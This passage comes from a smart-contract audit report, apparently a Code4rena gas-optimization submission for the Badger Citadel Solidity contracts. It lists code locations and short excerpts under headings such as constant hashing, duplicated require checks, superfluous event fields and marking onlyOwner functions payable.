bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n9. File: src/Funding.sol (lines [23-24](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L23-L24))\r\n```solidity\r\n    bytes32 public constant POLICY_OPERATIONS_ROLE =\r\n        keccak256(\"POLICY_OPERATIONS_ROLE\");\r\n```\r\n10. File: src/Funding.sol (line [25](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L25))\r\n```solidity\r\n    bytes32 public constant TREASURY_OPERATIONS_ROLE = keccak256(\"TREASURY_OPERATIONS_ROLE\");\r\n```\r\n11. File: src/Funding.sol (lines [26-27](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L26-L27))\r\n```solidity\r\n    bytes32 public constant TREASURY_VAULT_ROLE =\r\n        keccak256(\"TREASURY_VAULT_ROLE\");\r\n```\r\n12. File: src/Funding.sol (line [28](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L28))\r\n```solidity\r\n    bytes32 public constant KEEPER_ROLE = keccak256(\"KEEPER_ROLE\");\r\n```\r\n13. File: src/Funding.sol (line [30](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L30))\r\n```solidity\r\n    uint256 public constant MAX_BPS = 10000;\r\n```\r\n14. File: src/GlobalAccessControl.sol (lines [25-26](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L25-L26))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n15. File: src/GlobalAccessControl.sol (lines [27-28](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L27-L28))\r\n```solidity\r\n    bytes32 public constant TREASURY_GOVERNANCE_ROLE =\r\n        keccak256(\"TREASURY_GOVERNANCE_ROLE\");\r\n```\r\n16. File: src/GlobalAccessControl.sol (lines [30-31](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L30-L31))\r\n```solidity\r\n    bytes32 public constant TECH_OPERATIONS_ROLE =\r\n        keccak256(\"TECH_OPERATIONS_ROLE\");\r\n```\r\n17. File: src/GlobalAccessControl.sol (lines [32-33](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L32-L33))\r\n```solidity\r\n    bytes32 public constant POLICY_OPERATIONS_ROLE =\r\n        keccak256(\"POLICY_OPERATIONS_ROLE\");\r\n```\r\n18. File: src/GlobalAccessControl.sol (lines [34-35](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L34-L35))\r\n```solidity\r\n    bytes32 public constant TREASURY_OPERATIONS_ROLE =\r\n        keccak256(\"TREASURY_OPERATIONS_ROLE\");\r\n```\r\n19. File: src/GlobalAccessControl.sol (line [37](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L37))\r\n```solidity\r\n    bytes32 public constant KEEPER_ROLE = keccak256(\"KEEPER_ROLE\");\r\n```\r\n20. File: src/GlobalAccessControl.sol (line [39](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L39))\r\n```solidity\r\n    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\r\n```\r\n21. File: src/GlobalAccessControl.sol (line [40](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L40))\r\n```solidity\r\n    bytes32 public constant UNPAUSER_ROLE = keccak256(\"UNPAUSER_ROLE\");\r\n```\r\n22. File: src/GlobalAccessControl.sol (lines [42-43](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L42-L43))\r\n```solidity\r\n    bytes32 public constant BLOCKLIST_MANAGER_ROLE =\r\n        keccak256(\"BLOCKLIST_MANAGER_ROLE\");\r\n```\r\n23. File: src/GlobalAccessControl.sol (line [44](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L44))\r\n```solidity\r\n    bytes32 public constant BLOCKLISTED_ROLE = keccak256(\"BLOCKLISTED_ROLE\");\r\n```\r\n24. File: src/GlobalAccessControl.sol (lines [46-47](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L46-L47))\r\n```solidity\r\n    bytes32 public constant CITADEL_MINTER_ROLE =\r\n        keccak256(\"CITADEL_MINTER_ROLE\");\r\n```\r\n25. File: src/KnightingRound.sol (lines [19-20](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L19-L20))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n26. File: src/KnightingRound.sol (lines [21-22](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L21-L22))\r\n```solidity\r\n    bytes32 public constant TREASURY_GOVERNANCE_ROLE =\r\n        keccak256(\"TREASURY_GOVERNANCE_ROLE\");\r\n```\r\n27. File: src/KnightingRound.sol (lines [24-25](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L24-L25))\r\n```solidity\r\n    bytes32 public constant TECH_OPERATIONS_ROLE =\r\n        keccak256(\"TECH_OPERATIONS_ROLE\");\r\n```\r\n28. File: src/KnightingRound.sol (lines [26-27](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L26-L27))\r\n```solidity\r\n    bytes32 public constant TREASURY_OPERATIONS_ROLE =\r\n        keccak256(\"TREASURY_OPERATIONS_ROLE\");\r\n```\r\n29. File: src/lib/GlobalAccessControlManaged.sol (line [15](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L15))\r\n```solidity\r\n    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\r\n```\r\n30. File: src/lib/GlobalAccessControlManaged.sol (line [16](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L16))\r\n```solidity\r\n    bytes32 public constant UNPAUSER_ROLE = keccak256(\"UNPAUSER_ROLE\");\r\n```\r\n31. File: src/StakedCitadel.sol (line [112](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L112))\r\n```solidity\r\n    uint256 public constant MAX_BPS = 10_000;\r\n```\r\n32. File: src/StakedCitadel.sol (line [113](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L113))\r\n```solidity\r\n    uint256 public constant SECS_PER_YEAR = 31_556_952; // 365.2425 days\r\n```\r\n33. File: src/StakedCitadel.sol (line [115](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L115))\r\n```solidity\r\n    uint256 public constant WITHDRAWAL_FEE_HARD_CAP = 200; // Never higher than 2%\r\n```\r\n34. File: src/StakedCitadel.sol (line [116](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L116))\r\n```solidity\r\n    uint256 public constant PERFORMANCE_FEE_HARD_CAP = 3_000; // Never higher than 30% // 30% maximum performance fee // We usually do 20, so this is insanely high already\r\n```\r\n35. File: src/StakedCitadel.sol (line [117](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L117))\r\n```solidity\r\n    uint256 public constant MANAGEMENT_FEE_HARD_CAP = 200; // Never higher than 2%\r\n```\r\n36. File: src/StakedCitadelVester.sol (lines [20-21](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L20-L21))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n37. File: src/StakedCitadelVester.sol (line [34](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L34))\r\n```solidity\r\n    uint256 public constant INITIAL_VESTING_DURATION = 86400 * 21; // 21 days of vesting\r\n```\r\n38. File: src/SupplySchedule.sol (lines [22-23](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L22-L23))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n39. File: src/SupplySchedule.sol (line [25](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L25))\r\n```solidity\r\n    uint256 public constant epochLength = 21 days;\r\n```\r\n\r\n### Don't compare boolean expressions to boolean literals\r\n`if ( == true)` => `if ()`, `if ( == false)` => `if (!)`\r\n\r\n1. File: src/Funding.sol (line [147](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L147))\r\n```solidity\r\n            citadelPriceFlag == false,\r\n```\r\n\r\n### Duplicated `require()`/`revert()` checks should be refactored to a modifier or function\r\n\r\n1. File: external/MedianOracle.sol (line [84](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L84))\r\n```solidity\r\n        require(reportExpirationTimeSec_ <= MAX_REPORT_EXPIRATION_TIME);\r\n```\r\n2. File: external/MedianOracle.sol (line [109](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L109))\r\n```solidity\r\n        require(minimumProviders_ > 0);\r\n```\r\n3. File: src/Funding.sol (line [452](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L452))\r\n```solidity\r\n        require(_citadelPriceInAsset > 0, \"citadel price must not be zero\");\r\n```\r\n4. File: src/KnightingRound.sol (lines [293-296](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L293-L296))\r\n```solidity\r\n        require(\r\n            _saleStart >= block.timestamp,\r\n            \"KnightingRound: start date may not be in the past\"\r\n        );\r\n```\r\n5. File: src/KnightingRound.sol (lines [312-315](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L312-L315))\r\n```solidity\r\n        require(\r\n            _saleDuration > 0,\r\n            \"KnightingRound: the sale duration must not be zero\"\r\n        );\r\n```\r\n6. File: src/KnightingRound.sol (lines [331-334](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L331-L334))\r\n```solidity\r\n        require(\r\n            _tokenOutPrice > 0,\r\n            \"KnightingRound: the price must not be zero\"\r\n        );\r\n```\r\n7. File: src/KnightingRound.sol (lines [349-352](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L349-L352))\r\n```solidity\r\n        require(\r\n            _saleRecipient != address(0),\r\n            \"KnightingRound: sale recipient should not be zero\"\r\n        );\r\n```\r\n8. File: src/KnightingRound.sol (line [297](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L297))\r\n```solidity\r\n        require(!finalized, \"KnightingRound: already finalized\");\r\n```\r\n9. File: src/StakedCitadel.sol (line [700](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L700))\r\n```solidity\r\n        require(address(token) != _token, \"No want\");\r\n```\r\n10. File: src/StakedCitadel.sol (line [770](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L770))\r\n```solidity\r\n        require(!pausedDeposit, \"pausedDeposit\"); // dev: deposits are paused\r\n```\r\n11. File: src/SupplySchedule.sol (lines [179-182](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L179-L182))\r\n```solidity\r\n        require(\r\n            globalStartTimestamp > 0,\r\n            \"SupplySchedule: minting not started\"\r\n        );\r\n```\r\n12. File: src/SupplySchedule.sol (lines [187-190](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L187-L190))\r\n```solidity\r\n        require(\r\n            block.timestamp > lastMintTimestamp,\r\n            \"SupplySchedule: already minted up to current block\"\r\n        );\r\n```\r\n\r\n### Multiplication/division by two should use bit shifting\r\n` * 2` is equivalent to ` << 1` and ` / 2` is the same as ` >> 1`\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [431](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L431))\r\n```solidity\r\n            uint256 mid = (min + max + 1) / 2;\r\n```\r\n\r\n### Stack variable used as a cheaper cache for a state variable is only used once\r\nIf the variable is only accessed once, it's cheaper to use the state variable directly that one time\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [489](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L489))\r\n```solidity\r\n        uint256 epochindex = epochs.length;\r\n```\r\n\r\n### `require()` or `revert()` statements that check input arguments should be at the top of the function\r\nChecks that involve constants should come before checks that involve state variables\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [813](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L813))\r\n```solidity\r\n        require(_reward > 0, \"No reward\");\r\n```\r\n2. File: src/Funding.sol (lines [323-326](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L323-L326))\r\n```solidity\r\n        require(\r\n            _token != address(asset),\r\n            \"cannot sweep funding asset, use claimAssetToTreasury()\"\r\n        );\r\n```\r\n3. File: src/GlobalAccessControl.sol (lines [116-119](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L116-L119))\r\n```solidity\r\n        require(\r\n            keccak256(bytes(roleString)) == role,\r\n            \"Role string and role do not match\"\r\n        );\r\n```\r\n4. File: src/KnightingRound.sol (line [172](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L172))\r\n```solidity\r\n        require(_tokenInAmount > 0, \"_tokenInAmount should be > 0\");\r\n```\r\n5. File: src/StakedCitadel.sol (line [441](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L441))\r\n```solidity\r\n        require(address(token) != _token, \"No want\");\r\n```\r\n6. File: src/StakedCitadel.sol (line [487](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L487))\r\n```solidity\r\n        require(_treasury != address(0), \"Address 0\");\r\n```\r\n7. File: src/StakedCitadel.sol (line [502](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L502))\r\n```solidity\r\n        require(_strategy != address(0), \"Address 0\");\r\n```\r\n8. File: src/StakedCitadel.sol (line [523](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L523))\r\n```solidity\r\n        require(_fees <= WITHDRAWAL_FEE_HARD_CAP, \"withdrawalFee too high\");\r\n```\r\n9. File: src/StakedCitadel.sol (lines [535-538](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L535-L538))\r\n```solidity\r\n        require(\r\n            _fees <= PERFORMANCE_FEE_HARD_CAP,\r\n            \"performanceFeeStrategist too high\"\r\n        );\r\n```\r\n10. File: src/StakedCitadel.sol (line [550](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L550))\r\n```solidity\r\n        require(_fees <= MANAGEMENT_FEE_HARD_CAP, \"managementFee too high\");\r\n```\r\n11. File: src/StakedCitadel.sol (line [562](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L562))\r\n```solidity\r\n        require(_guardian != address(0), \"Address cannot be 0x0\");\r\n```\r\n12. File: src/StakedCitadel.sol (line [574](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L574))\r\n```solidity\r\n        require(_vesting != address(0), \"Address cannot be 0x0\");\r\n```\r\n13. File: src/StakedCitadel.sol (line [588](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L588))\r\n```solidity\r\n        require(_newToEarnBps <= MAX_BPS, \"toEarnBps should be <= MAX_BPS\");\r\n```\r\n14. File: src/StakedCitadel.sol (line [700](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L700))\r\n```solidity\r\n        require(address(token) != _token, \"No want\");\r\n```\r\n15. File: src/StakedCitadelVester.sol (line [138](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L138))\r\n```solidity\r\n        require(_amount > 0, \"StakedCitadelVester: cannot vest 0\");\r\n```\r\n16. File: src/SupplySchedule.sol (lines [94-97](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L94-L97))\r\n```solidity\r\n        require(\r\n            block.timestamp > lastMintTimestamp,\r\n            \"SupplySchedule: already minted up to current block\"\r\n        );\r\n```\r\n17. File: src/SupplySchedule.sol (lines [141-144](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L141-L144))\r\n```solidity\r\n        require(\r\n            _globalStartTimestamp >= block.timestamp,\r\n            \"SupplySchedule: minting must start at or after current time\"\r\n        );\r\n```\r\n18. File: src/SupplySchedule.sol (lines [187-190](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L187-L190))\r\n```solidity\r\n        require(\r\n            block.timestamp > lastMintTimestamp,\r\n            \"SupplySchedule: already minted up to current block\"\r\n        );\r\n```\r\n\r\n### Superfluous event fields\r\n`block.timestamp` and `block.number` are added to event information by default so adding them manually wastes gas\r\n\r\n1. File: external/MedianOracle.sol (line [38](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L38))\r\n```solidity\r\n    event ProviderReportPushed(address indexed provider, uint256 payload, uint256 timestamp);\r\n```\r\n2. File: src/StakedCitadel.sol (line [125](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L125))\r\n```solidity\r\n        uint256 indexed blockNumber,\r\n```\r\n3. File: src/StakedCitadel.sol (line [126](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L126))\r\n```solidity\r\n        uint256 timestamp\r\n```\r\n4. File: src/StakedCitadel.sol (line [133](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L133))\r\n```solidity\r\n        uint256 indexed blockNumber,\r\n```\r\n5. File: src/StakedCitadel.sol (line [134](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L134))\r\n```solidity\r\n        uint256 timestamp\r\n```\r\n\r\n### Use custom errors rather than `revert()`/`require()` strings to save deployment gas\r\n\r\n1. File: src/CitadelMinter.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol))\r\n2. File: src/Funding.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol))\r\n3. File: src/interfaces/convex/BoringMath.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/convex/BoringMath.sol))\r\n4. File: src/KnightingRound.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol))\r\n5. File: src/lib/GlobalAccessControlManaged.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol))\r\n6. File: src/lib/SettAccessControl.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SettAccessControl.sol))\r\n7. File: src/StakedCitadel.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol))\r\n8. File: src/StakedCitadelVester.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol))\r\n9. File: src/SupplySchedule.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol))\r\n\r\n### Functions guaranteed to revert when called by normal users can be marked `payable`\r\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\r\n\r\n1. File: external/MedianOracle.sol (lines [80-82](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L80-L82))\r\n```solidity\r\n    function setReportExpirationTimeSec(uint256 reportExpirationTimeSec_)\r\n        external\r\n        onlyOwner\r\n```\r\n2. File: external/MedianOracle.sol (lines [93-95](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L93-L95))\r\n```solidity\r\n    function setReportDelaySec(uint256 reportDelaySec_)\r\n        external\r\n        onlyOwner\r\n```\r\n3. File: external/MedianOracle.sol (lines [105-107](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L105-L107))\r\n```solidity\r\n    function setMinimumProviders(uint256 minimumProviders_)\r\n        external\r\n        onlyOwner\r\n```\r\n4. File: external/MedianOracle.sol (lines [207-209](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L207-L209))\r\n```solidity\r\n    function addProvider(address provider)\r\n        external\r\n        onlyOwner\r\n```\r\n5. File: external/MedianOracle.sol (lines [221-223](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L221-L223))\r\n```solidity\r\n    function removeProvider(address provider)\r\n        external\r\n        onlyOwner\r\n```\r\n6. File: external/StakedCitadelLocker.sol (lines [158-162](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L158-L162))\r\n```solidity\r\n    function addReward(\r\n        address _rewardsToken,\r\n        address _distributor,\r\n        bool _useBoost\r\n    ) public onlyOwner {\r\n```\r\n7. File: external/StakedCitadelLocker.sol (lines [173-177](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L173-L177))\r\n```solidity\r\n    function approveRewardDistributor(\r\n        address _rewardsToken,\r\n        address _distributor,\r\n        bool _approved\r\n    ) external onlyOwner {\r\n```\r\n8. File: external/StakedCitadelLocker.sol (line [183](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L183))\r\n```solidity\r\n    function setStakingContract(address _staking) external onlyOwner {\r\n```\r\n9. File: external/StakedCitadelLocker.sol (line [190](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L190))\r\n```solidity\r\n    function setStakeLimits(uint256 _minimum, uint256 _maximum) external onlyOwner {\r\n```\r\n10. File: external/StakedCitadelLocker.sol (line [200](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L200))\r\n```solidity\r\n    function setBoost(uint256 _max, uint256 _rate, address _receivingAddress) external onlyOwner {\r\n```\r\n11. File: external/StakedCitadelLocker.sol (line [210](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L210))\r\n```solidity\r\n    function setKickIncentive(uint256 _rate, uint256 _delay) external onlyOwner {\r\n```\r\n12. File: external/StakedCitadelLocker.sol (line [218](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L218))\r\n```solidity\r\n    function shutdown() external onlyOwner {\r\n```\r\n13. File: external/StakedCitadelLocker.sol (line [825](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L825))\r\n```solidity\r\n    function recoverERC20(address _tokenAddress, uint256 _tokenAmount) external onlyOwner {\r\n```\r\n14. File: src/CitadelMinter.sol (lines [169-173](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L169-L173))\r\n```solidity\r\n    function mintAndDistribute()\r\n        external\r\n        onlyRole(POLICY_OPERATIONS_ROLE)\r\n        gacPausable\r\n        nonReentrant\r\n```\r\n15. File: src/CitadelMinter.sol (lines [250-254](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L250-L254))\r\n```solidity\r\n    function setFundingPoolWeight(address _pool, uint256 _weight)\r\n        external\r\n        onlyRole(POLICY_OPERATIONS_ROLE)\r\n        gacPausable\r\n        nonReentrant\r\n```\r\n16. File: src/CitadelMinter.sol (lines [294-298](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L294-L298))\r\n```solidity\r\n    function setCitadelDistributionSplit(\r\n        uint256 _fundingBps,\r\n        uint256 _stakingBps,\r\n        uint256 _lockingBps\r\n    ) external onlyRole(POLICY_OPERATIONS_ROLE) gacPausable nonReentrant {\r\n```\r\n17. File: src/CitadelMinter.sol (lines [314-317](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L314-L317))\r\n```solidity\r\n    function initializeLastMintTimestamp()\r\n        external\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n        gacPausable\r\n```\r\n18. File: src/CitadelToken.sol (lines [40-43](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelToken.sol#L40-L43))\r\n```solidity\r\n    function mint(address dest, uint256 amount)\r\n        external\r\n        